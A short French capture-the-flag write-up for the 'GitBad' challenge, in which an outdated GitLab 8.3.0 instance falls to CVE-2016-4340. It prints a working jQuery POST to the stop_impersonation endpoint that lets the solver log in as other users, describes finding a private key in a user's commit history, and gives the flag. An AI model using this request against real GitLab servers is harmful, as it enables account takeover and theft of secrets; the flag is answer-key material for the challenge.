# GitBad

## Description :
La plateforme Gitlab créée par un stagiaire de DGA MI semble être ouverte à tous !

Vous devez en profiter pour retrouver des informations sensibles. Les comptes créés sur Gitlab sont validés toutes les trois secondes.

## Solution :
Le site utilise une ancienne version vulnérable de **GitLab** (8.3.0).
Cette version est vulnérable à la **CVE-2016-4340** : https://www.cvedetails.com/cve/CVE-2016-4340/.

En cherchant dans les dépots publics on retrouve plusieurs comptes, on peut donc via cet exploit s'y connecter en récupérant notre `authenticity_token` en utilisant la raquête suivante (en remplaçant `USERNAME` par le nom d'utilsateur de la victime):

`$.post("http://gitbad2.chall.malicecyber.com/admin/users/stop_impersonation?id=USERNAME", "_method=delete&authenticity_token=3dU2TMZfvCwUxQWtel6WofJ8cd/WFNX4JnujF2oTT/VMrAuqCH1EMyyQNG870m3S2ezLnkXKgV6jrpt0+4d+wg==");`

En testant la les comptes on tombe sur celui de `stephan`, qui à upload sa private key sur son projet `my-secret-project` retrouvable dans les commits et celle ci contient le flag ! 

Flag : `W3lL-d0N3-y0u-w1n-a_c4ke!`